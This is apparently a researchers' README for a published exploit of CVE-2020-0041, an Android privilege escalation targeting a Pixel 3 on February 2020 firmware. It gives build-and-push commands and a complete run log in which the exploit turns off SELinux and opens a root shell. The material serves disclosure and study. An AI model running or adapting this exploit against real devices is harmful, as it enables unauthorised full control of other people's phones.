# CVE-2020-0041: privilege escalation exploit

This folder contains the local privilege escalation exploit we wrote for CVE-2020-0041. 
The exploit is provided with hardcoded offsets for a Pixel 3 device running the February 
2020 firmware (QQ1A.200205.002). The exploit needs to be adapted before being able to 
run it on other vulnerable devices or Pixel 3 devices with different firmware versions.

The exploit disables SELinux and then launches a root shell.

## Testing the exploit

The exploit can be built by simply running "make" with the Android NDK in the path. It can also 
be pushed to a phone attached with adb by doing "make all push" (warnings removed for brevity):

```
user@laptop:~/CVE-2020-0041/lpe$ make all push
Building Android
NDK_PROJECT_PATH=. ndk-build NDK_APPLICATION_MK=./Application.mk
make[1]: Entering directory `/home/user/CVE-2020-0041/lpe'
[arm64-v8a] Compile        : poc <= exploit.c
[arm64-v8a] Compile        : poc <= endpoint.c
[arm64-v8a] Compile        : poc <= pending_node.c
[arm64-v8a] Compile        : poc <= binder.c
[arm64-v8a] Compile        : poc <= log.c
[arm64-v8a] Compile        : poc <= helpers.c
[arm64-v8a] Compile        : poc <= binder_lookup.c
[arm64-v8a] Compile        : poc <= realloc.c
[arm64-v8a] Compile        : poc <= node.c
[arm64-v8a] Executable     : poc
[arm64-v8a] Install        : poc => libs/arm64-v8a/poc
make[1]: Leaving directory `/home/user/CVE-2020-0041/lpe'
adb push libs/arm64-v8a/poc /data/local/tmp/poc
libs/arm64-v8a/poc: 1 file pushed. 4.3 MB/s (39016 bytes in 0.009s)
```

Now just run /data/local/tmp/poc from an adb shell to see the exploit running:

```
blueline:/ $ /data/local/tmp/poc
[+] Mapped 200000
[+] selinux_enforcing before exploit: 1
[+] pipe file: 0xffffffd9c67c7700
[*] file epitem at ffffffda545d7d00
[*] Reallocating content of 'write8_inode' with controlled data.[DONE]
[+] Overwriting 0xffffffd9c67c7720 with 0xffffffda545d7d50...[DONE]
[*] Write done, should have arbitrary read now.
[+] file operations: ffffff97df1af650
[+] kernel base: ffffff97dd280000
[*] Reallocating content of 'write8_selinux' with controlled data.[DONE]
[+] Overwriting 0xffffff97dfe24000 with 0x0...[DONE]
[*] init_cred: ffffff97dfc300a0
[+] memstart_addr: 0xffffffe700000000
[+] First level entry: ceac5003 -> next table at ffffffd9ceac5000
[+] Second level entry: f173c003 -> next table at ffffffd9f173c000
[+] sysctl_table_root = ffffff97dfc5a3f8
[*] Reallocating content of 'write8_sysctl' with controlled data.[DONE]
[+] Overwriting 0xffffffda6da8d868 with 0xffffffda49ced000...[DONE]
[+] Injected sysctl node!
[*] Node write8_inode, pid 7058, kaddr ffffffda0723f900
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Node write8_selinux, pid 6848, kaddr ffffffd9c9fa2400
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Node write8_sysctl, pid 7110, kaddr ffffffda67e7d180
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[+] Cleaned up sendmsg threads
[*] epitem.next = ffffffd9c67c7720
[*] epitem.prev = ffffffd9c67c77d8
^[[*] Launching privileged shell
root_by_cve-2020-0041:/ # id   
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
root_by_cve-2020-0041:/ # getenforce
Permissive
root_by_cve-2020-0041:/ # 
```
